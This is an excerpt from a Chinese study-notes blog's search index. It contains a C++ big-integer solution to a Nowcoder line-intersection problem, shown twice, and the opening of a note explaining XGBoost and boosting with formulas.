{ string s; is >> s; n.clear(); for (int i = s.size() - 1; i >= 0; --i) n.push_back(s[i] - '0'); return is; } ostream& operator<<(ostream& os, const Wint& n) { if (n.empty()) os << 0; for (int i = n.size() - 1; i >= 0; --i) os << n[i]; return os; } //\u6bd4\u8f83\uff0c\u53ea\u9700\u8981\u5199\u4e24\u4e2a\uff0c\u5176\u4ed6\u7684\u76f4\u63a5\u4ee3\u5165\u5373\u53ef //\u5e38\u91cf\u5f15\u7528\u5f53\u53c2\u6570\uff0c\u907f\u514d\u62f7\u8d1d\u66f4\u9ad8\u6548 bool operator!=(const Wint& a, const Wint& b) { if (a.size() != b.size()) return 1; for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return 1; return 0; } bool operator==(const Wint& a, const Wint& b) { return !(a != b); } bool operator<(const Wint& a, const Wint& b) { if (a.size() != b.size()) return a.size() < b.size(); for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return a[i] < b[i]; return 0; } bool operator>(const Wint& a, const Wint& b) { return b < a; } bool operator<=(const Wint& a, const Wint& b) { return !(a > b); } bool operator>=(const Wint& a, const Wint& b) { return !(a < b); } //\u52a0\u6cd5\uff0c\u5148\u5b9e\u73b0+=\uff0c\u8fd9\u6837\u66f4\u7b80\u6d01\u9ad8\u6548 Wint& operator+=(Wint& a, const Wint& b) { if (a.size() < b.size()) a.resize(b.size()); for (size_t i = 0; i != b.size(); ++i) a[i] += b[i]; return a.check(); } Wint operator+(Wint a, const Wint& b) { return a += b; } //\u51cf\u6cd5\uff0c\u8fd4\u56de\u5dee\u7684\u7edd\u5bf9\u503c\uff0c\u7531\u4e8e\u540e\u9762\u6709\u4ea4\u6362\uff0c\u6545\u53c2\u6570\u4e0d\u7528\u5f15\u7528 Wint& operator-=(Wint& a, Wint b) { if (a < b) swap(a, b); for (size_t i = 0; i != b.size(); a[i] -= b[i], ++i) if (a[i] < b[i]) //\u9700\u8981\u501f\u4f4d { size_t j = i + 1; while (!a[j]) ++j; while (j > i) { --a[j]; a[--j] += 10; } } return a.check(); } Wint operator-(Wint a, const Wint& b) { return a -= b; } //\u4e58\u6cd5\u4e0d\u80fd\u5148\u5b9e\u73b0*=\uff0c\u539f\u56e0\u81ea\u5df1\u60f3 Wint operator*(const Wint& a, const Wint& b) { Wint n; n.assign(a.size() + b.size() - 1, 0); for (size_t i = 0; i != a.size(); ++i) for (size_t j = 0; j != b.size(); ++j) n[i + j] += a[i] * b[j]; return n.check(); } Wint& operator*=(Wint& a, const Wint& b) { return a = a * b; } //\u9664\u6cd5\u548c\u53d6\u6a21\u5148\u5b9e\u73b0\u4e00\u4e2a\u5e26\u4f59\u9664\u6cd5\u51fd\u6570 Wint divmod(Wint& a, const Wint& b) { Wint ans; for (int t = a.size() - b.size(); a >= b; --t) { Wint d; d.assign(t + 1, 0); d.back() = 1; Wint c = b * d; while (a >= c) { a -= c; ans += d; } } return ans; } Wint operator/(Wint a, const Wint& b) { return divmod(a, b); } Wint& operator/=(Wint& a, const Wint& b) { return a = a / b; } Wint& operator%=(Wint& a, const Wint& b) { divmod(a, b); return a; } Wint operator%(Wint a, const Wint& b) { return a %= b; } //\u987a\u624b\u5b9e\u73b0\u4e00\u4e2a\u5feb\u901f\u5e42\uff0c\u53ef\u4ee5\u770b\u5230\u548c\u666e\u901a\u5feb\u901f\u5e42\u51e0\u4e4e\u65e0\u5f02 Wint pow(const Wint& n, const Wint& k) { if (k.empty()) return 1; if (k == 2) return n * n; if (k.back() % 2) return n * pow(n, k - 1); return pow(pow(n, k / 2), 2); } int main() { int t; Wint n; cin >> t; while (t--) { cin >> n; cout << n * (n - 1) / 2 << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#nc207427","text":"","title":"\u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#_1","text":"\u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#12-problem-description","text":"\u5e73\u9762\u4e0a\u5b58\u5728 n \u6761\u76f4\u7ebf\u3002\u8bf7\u95ee n \u6761\u76f4\u7ebf\u5728\u5e73\u9762\u4e0a\u6700\u591a\u5b58\u5728\u591a\u5c11\u4ea4\u70b9\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#13-input","text":"\u8f93\u5165\u6570\u636e\u7684\u7b2c\u4e00\u884c\u662ft\uff0c\u8868\u793a\u6570\u636e\u7684\u7ec4\u6570 \uff08t < 100\uff09 , \u63a5\u4e0b\u6765\u6bcf\u7ec4\u6570\u636e\u8f93\u5165\u4e00\u4e2a n\uff081 \\le n \\le 1e15\uff09","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#14-output","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u8f93\u5165\u6837\u4f8b\uff0c\u6253\u5370 n \u6761\u76f4\u7ebf\u6700\u591a\u6709\u591a\u5c11\u4e2a\u4ea4\u70b9","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#15-sample-input","text":"2 1 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#16-sample-output","text":"0 1","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#17-source","text":"\u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#2","text":"\u7b2c i + 1 \u6761\u7ebf\u6700\u591a\u80fd\u548c\u524d i \u6761\u7ebf\u90fd\u76f8\u4ea4\uff0c\u4ea7\u751f i \u4e2a\u65b0\u7684\u4ea4\u70b9\u3002 \u6240\u4ee5\u6700\u7ec8\u7ed3\u679c\u4e3a \\frac{n(n-1)}{2} \u4f46\u7531\u4e8e n \u7684\u6570\u636e\u8303\u56f4\u5f88\u5927 \uff081 \\le n \\le 1e15\uff09 \uff0c\u6240\u4ee5\u8981\u4f7f\u7528\u9ad8\u7cbe\u5ea6\u8fdb\u884c\u8ba1\u7b97\u3002\u9ad8\u7cbe\u5ea6\u6a21\u677f\u53c2\u8003\u81ea \u767e\u5ea6\u767e\u79d1-\u9ad8\u7cbe\u5ea6\u7b97\u6cd5 \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/#3","text":"#include <algorithm> #include <iostream> #include <vector> using namespace std; struct Wint : vector<int> //\u7528\u6807\u51c6\u5e93vector\u505a\u57fa\u7c7b\uff0c\u5b8c\u7f8e\u89e3\u51b3\u4f4d\u6570\u95ee\u9898\uff0c\u540c\u65f6\u66f4\u6613\u4e8e\u5b9e\u73b0 { //\u5c06\u4f4e\u7cbe\u5ea6\u8f6c\u9ad8\u7cbe\u5ea6\u7684\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u81ea\u52a8\u88ab\u7f16\u8bd1\u5668\u8c03\u7528 //\u56e0\u6b64\u65e0\u9700\u5355\u72ec\u5199\u9ad8\u7cbe\u5ea6\u6570\u548c\u4f4e\u7cbe\u5ea6\u6570\u7684\u8fd0\u7b97\u51fd\u6570\uff0c\u5341\u5206\u65b9\u4fbf Wint(int n = 0) //\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\uff0c\u4f460\u7684\u4fdd\u5b58\u5f62\u5f0f\u4e3a\u7a7a { push_back(n); check(); } Wint& check() //\u5728\u5404\u7c7b\u8fd0\u7b97\u4e2d\u7ecf\u5e38\u7528\u5230\u7684\u8fdb\u4f4d\u5c0f\u51fd\u6570\uff0c\u4e0d\u59a8\u5185\u7f6e { while (!empty() && !back()) pop_back(); //\u53bb\u9664\u6700\u9ad8\u4f4d\u53ef\u80fd\u5b58\u5728\u76840 if (empty()) return *this; for (size_t i = 1; i < size(); ++i) //\u5904\u7406\u8fdb\u4f4d { (*this)[i] += (*this)[i - 1] / 10; (*this)[i - 1] %= 10; } while (back() >= 10) { push_back(back() / 10); (*this)[size() - 2] %= 10; } return *this; //\u4e3a\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c06\u8fdb\u4f4d\u540e\u7684\u81ea\u8eab\u8fd4\u56de\u5f15\u7528 } }; //\u8f93\u5165\u8f93\u51fa istream& operator>>(istream& is, Wint& n) { string s; is >> s; n.clear(); for (int i = s.size() - 1; i >= 0; --i) n.push_back(s[i] - '0'); return is; } ostream& operator<<(ostream& os, const Wint& n) { if (n.empty()) os << 0; for (int i = n.size() - 1; i >= 0; --i) os << n[i]; return os; } //\u6bd4\u8f83\uff0c\u53ea\u9700\u8981\u5199\u4e24\u4e2a\uff0c\u5176\u4ed6\u7684\u76f4\u63a5\u4ee3\u5165\u5373\u53ef //\u5e38\u91cf\u5f15\u7528\u5f53\u53c2\u6570\uff0c\u907f\u514d\u62f7\u8d1d\u66f4\u9ad8\u6548 bool operator!=(const Wint& a, const Wint& b) { if (a.size() != b.size()) return 1; for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return 1; return 0; } bool operator==(const Wint& a, const Wint& b) { return !(a != b); } bool operator<(const Wint& a, const Wint& b) { if (a.size() != b.size()) return a.size() < b.size(); for (int i = a.size() - 1; i >= 0; --i) if (a[i] != b[i]) return a[i] < b[i]; return 0; } bool operator>(const Wint& a, const Wint& b) { return b < a; } bool operator<=(const Wint& a, const Wint& b) { return !(a > b); } bool operator>=(const Wint& a, const Wint& b) { return !(a < b); } //\u52a0\u6cd5\uff0c\u5148\u5b9e\u73b0+=\uff0c\u8fd9\u6837\u66f4\u7b80\u6d01\u9ad8\u6548 Wint& operator+=(Wint& a, const Wint& b) { if (a.size() < b.size()) a.resize(b.size()); for (size_t i = 0; i != b.size(); ++i) a[i] += b[i]; return a.check(); } Wint operator+(Wint a, const Wint& b) { return a += b; } //\u51cf\u6cd5\uff0c\u8fd4\u56de\u5dee\u7684\u7edd\u5bf9\u503c\uff0c\u7531\u4e8e\u540e\u9762\u6709\u4ea4\u6362\uff0c\u6545\u53c2\u6570\u4e0d\u7528\u5f15\u7528 Wint& operator-=(Wint& a, Wint b) { if (a < b) swap(a, b); for (size_t i = 0; i != b.size(); a[i] -= b[i], ++i) if (a[i] < b[i]) //\u9700\u8981\u501f\u4f4d { size_t j = i + 1; while (!a[j]) ++j; while (j > i) { --a[j]; a[--j] += 10; } } return a.check(); } Wint operator-(Wint a, const Wint& b) { return a -= b; } //\u4e58\u6cd5\u4e0d\u80fd\u5148\u5b9e\u73b0*=\uff0c\u539f\u56e0\u81ea\u5df1\u60f3 Wint operator*(const Wint& a, const Wint& b) { Wint n; n.assign(a.size() + b.size() - 1, 0); for (size_t i = 0; i != a.size(); ++i) for (size_t j = 0; j != b.size(); ++j) n[i + j] += a[i] * b[j]; return n.check(); } Wint& operator*=(Wint& a, const Wint& b) { return a = a * b; } //\u9664\u6cd5\u548c\u53d6\u6a21\u5148\u5b9e\u73b0\u4e00\u4e2a\u5e26\u4f59\u9664\u6cd5\u51fd\u6570 Wint divmod(Wint& a, const Wint& b) { Wint ans; for (int t = a.size() - b.size(); a >= b; --t) { Wint d; d.assign(t + 1, 0); d.back() = 1; Wint c = b * d; while (a >= c) { a -= c; ans += d; } } return ans; } Wint operator/(Wint a, const Wint& b) { return divmod(a, b); } Wint& operator/=(Wint& a, const Wint& b) { return a = a / b; } Wint& operator%=(Wint& a, const Wint& b) { divmod(a, b); return a; } Wint operator%(Wint a, const Wint& b) { return a %= b; } //\u987a\u624b\u5b9e\u73b0\u4e00\u4e2a\u5feb\u901f\u5e42\uff0c\u53ef\u4ee5\u770b\u5230\u548c\u666e\u901a\u5feb\u901f\u5e42\u51e0\u4e4e\u65e0\u5f02 Wint pow(const Wint& n, const Wint& k) { if (k.empty()) return 1; if (k == 2) return n * n; if (k.back() % 2) return n * pow(n, k - 1); return pow(pow(n, k / 2), 2); } int main() { int t; Wint n; cin >> t; while (t--) { cin >> n; cout << n * (n - 1) / 2 << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/","text":"XGBoost\u539f\u7406\u7b80\u4ecb # \u76ee\u5f55 # XGBoost\u539f\u7406\u7b80\u4ecb \u76ee\u5f55 1. \u80cc\u666f 2. Boosting 2.1. \u5efa\u7acb\u6620\u5c04 2.2. \u8ba1\u7b97\u53c2\u6570 3. XGBoost\u7684\u76ee\u6807\u51fd\u6570 4. \u5316\u7b80\u76ee\u6807\u51fd\u6570 5. \u4f7f\u7528\u6cf0\u52d2\u7ea7\u6570\u8fd1\u4f3c\u76ee\u6807\u51fd\u6570 6. \u6a21\u578b\u53c2\u6570\u5316 7. \u5bfb\u627e\u6700\u4f73\u5206\u88c2\u70b9 8. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u542c\u4e86 \u8d2a\u5fc3\u5b66\u9662 \u4e3b\u529e\uff0c\u674e\u6587\u54f2\u8001\u5e08\u4e3b\u8bb2\u7684 \u300aXGBoost\u7684\u6280\u672f\u5256\u6790\u300b\u76f4\u64ad \uff0c\u8ba9\u6211\u5bf9XGB\u7684\u539f\u7406\u6709\u4e86\u4e00\u4e9b\u4e86\u89e3\u3002\u4e8e\u662f\u6211\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u6574\u7406\u4e00\u4e0b\u542c\u8bfe\u7684\u5185\u5bb9\u3002 \u8001\u5e08\u8bb2\u5f97\u633a\u901a\u4fd7\u6613\u61c2\u7684\uff0c\u4e0d\u8fc7\u7531\u4e8eXGB\u672c\u8eab\u5177\u6709\u4e00\u5b9a\u7684\u590d\u6742\u6027\uff0c\u8981\u770b\u61c2\u8fd9\u7bc7\u7b14\u8bb0\u9700\u8981\u6709\u5982\u4e0b\u7684\u80cc\u666f\u77e5\u8bc6\uff1a \u51b3\u7b56\u6811\u7684\u539f\u7406 \u6cf0\u52d2\u7ea7\u6570 \u635f\u5931\u51fd\u6570 \u60e9\u7f5a\u51fd\u6570 \u5982\u679c\u5bf9\u8fd9\u4e9b\u6982\u5ff5\u4e0d\u592a\u4e86\u89e3\uff0c\u63a8\u8350\u9605\u8bfb\u590d\u65e6\u5927\u5b66\u90b1\u9521\u9e4f\u8001\u5e08\u7684\u5f00\u6e90\u4e66 \u300a\u795e\u7ecf\u7f51\u7edc\u4e0e\u6df1\u5ea6\u5b66\u4e60\u300b \u8fd8\u6709\u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e\u7684 \u300a\u673a\u5668\u5b66\u4e60\u5b9e\u6218\u300b \uff0c\u6cf0\u52d2\u7ea7\u6570\u53ef\u4ee5\u53c2\u8003\u9ad8\u6570\u8bfe\u672c\u548c\u7f51\u7edc\u8d44\u6599\u3002 2. Boosting # \u4ece XGBoost \u8fd9\u4e2a\u540d\u5b57\u5c31\u80fd\u770b\u51fa\u6765\uff0c\u8fd9\u4e2a\u6a21\u578b\u4f7f\u7528\u4e86 Boosting \u7684\u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6765\u5148\u4e86\u89e3\u4e00\u4e0b Boosting \u5b83\u662f\u4e2a\u5565\u73a9\u610f\u513f\u3002 \\text{Figure 1. Bagging vs Boosting} \u8001\u5e08\u7684PPT\u4e2d\u5bf9\u6bd4\u4e86 Bagging \u548c Boosting \u4e24\u79cd\u5e38\u7528\u7684\u96c6\u6210\u5b66\u4e60\u65b9\u6cd5\u3002 Bagging \uff1a\u5229\u7528\u591a\u4e2a\u8fc7\u62df\u5408\u7684\u5f31\u5b66\u4e60\u5668\u6765\u83b7\u5f97\u66f4\u597d\u7684\u6548\u679c\u3002\u5178\u578b\u7684\u7b97\u6cd5\u6709\u968f\u673a\u68ee\u6797\u3002 Boosting \uff1a\u5229\u7528\u591a\u4e2a\u6b20\u62df\u5408\u7684\u5f31\u5b66\u4e60\u5668\u6765\u83b7\u5f97\u66f4\u597d\u7684\u6548\u679c\u3002\u5178\u578b\u7684\u7b97\u6cd5\u6709GBDT/GBRT\uff0cAdaboost\uff0cXGBoost\u548cLightGBM\u3002 Boosting \u672c\u8eab\u5728\u4e0d\u540c\u7b97\u6cd5\u4e2d\u7684\u5177\u4f53\u5e94\u7528\u4e5f\u4e0d\u5b8c\u5168\u76f8\u540c\uff0c\u800c\u4ece XGBoost 1 \u7684 \u8bba\u6587 \u4e2d\u6211\u4eec\u80fd\u591f\u4e86\u89e3\u5230\uff0c\u5b83\u4e3b\u8981\u501f\u9274\u4e86 GBDT \u7684 Boosting \u65b9\u6cd5 \u4e3a\u4e86\u52a0\u6df1\u5bf9 Boosting \u7684\u4e86\u89e3\uff0c\u6211\u628a GBDT 2 \u7684 \u8bba\u6587 \u4e5f\u627e\u51fa\u6765\u770b\u4e86\u4e00\u4e0b\u3002 2.1. \u5efa\u7acb\u6620\u5c04 # \u9996\u5148\uff0c\u6211\u4eec\u901a\u8fc7\u516c\u5f0f (1) \u5efa\u7acb\u4ece \\mathbf{x} \u5230 y \u7684\u6620\u5c04\u3002 \\widehat{y} = F\\left(\\mathbf{x} ;\\left\\{\\beta_{m}, \\mathbf{a}_{m}\\right\\}_{1}^{M}\\right)=\\sum_{m=1}^{M} \\beta_{m} h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \\tag{1} \u8fd9\u91cc\u7684 \\mathbf{x} \u548c \\mathbf{a}_{m} \u7528\u7c97\u4f53\u663e\u793a\uff0c\u8868\u793a\u5b83\u4eec\u90fd\u662f\u5411\u91cf\uff0c \\widehat{y} \u8868\u793a\u6a21\u578b\u7684\u9884\u6d4b\u503c\u3002 \u516c\u5f0f (1) \u4e2d\u7684 h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \u8868\u793a\u4e00\u4e2a\u4e2a\u5f31\u5206\u7c7b\u5668\uff0c \\mathbf{a}_{m} \u662f\u5f31\u5206\u7c7b\u5668\u7684\u53c2\u6570\uff0c \\beta_m \u662f\u5176\u6743\u91cd\uff0c \\left\\{\\beta_{m}, \\mathbf{a}_{m}\\right\\}_{1}^{M} \u662f \\mathbf{a}_{m} \u548c \\beta_m \u7684 M \u4e2a\u7ec4\u5408\u3002 M \u8868\u793a\u5f31\u5206\u7c7b\u5668\u7684\u6570\u91cf\u3002 \u516c\u5f0f (1) \u8868\u793a GBDT \u662f\u901a\u8fc7\u5bf9\u591a\u4e2a\u5f31\u5206\u7c7b\u5668\u7ed3\u679c\u8fdb\u884c\u7ebf\u6027\u52a0\u6743\u6c42\u548c\u4ece\u800c\u6c42\u51fa\u6700\u7ec8\u7ed3\u679c\u7684\u3002 2.2. \u8ba1\u7b97\u53c2\u6570 # \u5efa\u7acb\u4e86 \\mathbf{x} \u5230 y \u7684\u6620\u5c04\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5982\u4f55\u53bb\u8ba1\u7b97\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u3002 \\left(\\beta_{m}, \\mathbf{a}_{m}\\right)=\\arg \\min _{\\beta, \\mathbf{a}} \\sum_{i=1}^{N} L\\left(y_{i}, F_{m-1}\\left(\\mathbf{x}_{i}\\right)+\\beta h\\left(\\mathbf{x}_{i} ; \\mathbf{a}\\right)\\right) \\tag{2} \u516c\u5f0f (2) \u4e2d\uff0c \\displaystyle\\arg \\min _{\\beta, \\mathbf{a}} \u8868\u793a\u4f7f\u5176\u53f3\u8fb9\u7684\u8868\u8fbe\u5f0f\u6700\u5c0f\u7684 (\\beta, \\mathbf{a}) \u7ec4\u5408\uff0c L(y_i, \\hat{y_i}) \u4e3a\u635f\u5931\u51fd\u6570\u3002 \u516c\u5f0f (2) \u8bf4\u660e\u53c2\u6570 \\left(\\beta_{m}, \\mathbf{a}_{m}\\right) \u662f\u901a\u8fc7\u4f7f\u5f97\u635f\u5931\u51fd\u6570\u6700\u5c0f\u5316\u8ba1\u7b97\u51fa\u6765\u7684\uff0c\u5177\u4f53\u5982\u4f55\u8ba1\u7b97\u5c31\u53d6\u51b3\u4e8e\u6211\u4eec\u4f7f\u7528\u4ec0\u4e48\u5177\u4f53\u7684\u635f\u5931\u51fd\u6570\u548c\u4f18\u5316\u5668\u4e86\u3002 \u540c\u65f6\uff0c \u6211\u4eec\u8fd8\u53ef\u4ee5\u63a8\u51fa\u516c\u5f0f (3) \u3002 F_{m}(\\mathbf{x})=F_{m-1}(\\mathbf{x})+\\beta_{m} h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \\tag{3} \u516c\u5f0f (3) \u4e2d F_{m}(\\mathbf{x}) \u662f\u8bad\u7ec3\u5b8c m \u4e2a\u5f31\u5206\u7c7b\u5668\u4ee5\u540e\uff0c\u6a21\u578b\u7684\u8f93\u51fa\u7ed3\u679c\u3002 \u516c\u5f0f (3) \u8bf4\u660e GBDT \u5728\u8bad\u7ec3\u6bcf\u7b2c m \u4e2a\u5f31\u5206\u7c7b\u5668\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5148\u5c06\u524d m-1 \u4e2a\u5f31\u5206\u7c7b\u5668\u7684\u9884\u6d4b\u7ed3\u679c\u6c42\u548c\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a\u65b0\u7684\u9884\u6d4b\u7ed3\u679c\uff0c\u5728\u6b64\u57fa\u7840\u4e0a\u5bf9\u7b2c m \u4e2a\u5f31\u5206\u7c7b\u5668\u8fdb\u884c\u8bad\u7ec3\u548c\u9884\u6d4b\u3002\u5373\u65b0\u7684\u5f31\u5206\u7c7b\u5668\u662f\u5728\u5df2\u6709\u6a21\u578b\u7684 \u6b8b\u5dee \u4e0a\u8fdb\u884c\u8bad\u7ec3\u7684\u3002 \u53ef\u7406\u89e3\u4e3a\u5982\u4e0b\u516c\u5f0f\u3002 \\beta_{m} h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \\to (y_i - \\sum_{k=1}^{m-1} \\beta_{k} h\\left(\\mathbf{x} ; \\mathbf{a}_{k}\\right)) \\tag{4} \u5373\u7b2c m \u4e2a\u5f31\u5206\u7c7b\u5668\u7684\u8bad\u7ec3\u76ee\u6807\u662f\u8f93\u51fa\u8d8b\u8fd1\u4e8e y_i \u548c \u524d m - 1 \u4e2a\u5f31\u5206\u7c7b\u5668\u7684\u7ed3\u679c\u4e4b\u548c\u7684\u5dee\u503c\u3002 \u518d\u7ed3\u5408\u8001\u5e08PPT\u4e2d\u7684\u4f8b\u5b50\uff0c\u5e94\u8be5\u5c31\u80fd\u591f\u5f88\u597d\u5730\u7406\u89e3 Boosting \u7684\u4f5c\u7528\u3002 \\text{Figure 2. Boost Tree} \\text{Figure 3. Model Predict} 3. XGBoost\u7684\u76ee\u6807\u51fd\u6570 # \u4e86\u89e3\u4e86 Boosting \u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u5b66\u4e60 XGBoost \u4e86\uff0c\u9996\u5148\u4ece\u5b83\u7684\u76ee\u6807\u51fd\u6570\u5f00\u59cb\u5206\u6790\u3002 \\text{Figure 4. Object Function} \u6211\u4eec\u4e00\u822c\u4f7f\u7528\u6811\u6a21\u578b\u6765\u4f5c\u4e3a\u5f31\u5206\u7c7b\u5668\uff0c\u5047\u8bbe\u6709 K \u9897\u6811\uff0c\u5bf9\u7b2c i \u4e2a\u8f93\u5165\uff0c\u5b83\u4eec\u7684\u9884\u6d4b\u503c\u4e3a \\widehat{y}_i \u3002 \\widehat{y}_{i}=\\sum_{k=1}^{K} f_{k}\\left(\\mathbf{x}_{i}\\right),\\ \\ f_{k} \\in {\\mathcal{F}} \\tag{5} \u516c\u5f0f (5) \u4e2d f_k(\\mathbf{x}_i) \u8868\u793a\u7b2c k \u9897\u6811\u5bf9\u7b2c i \u4e2a\u8f93\u5165\u5411\u91cf\u7684\u9884\u6d4b\u8f93\u51fa\u3002 \u800c XGBoost 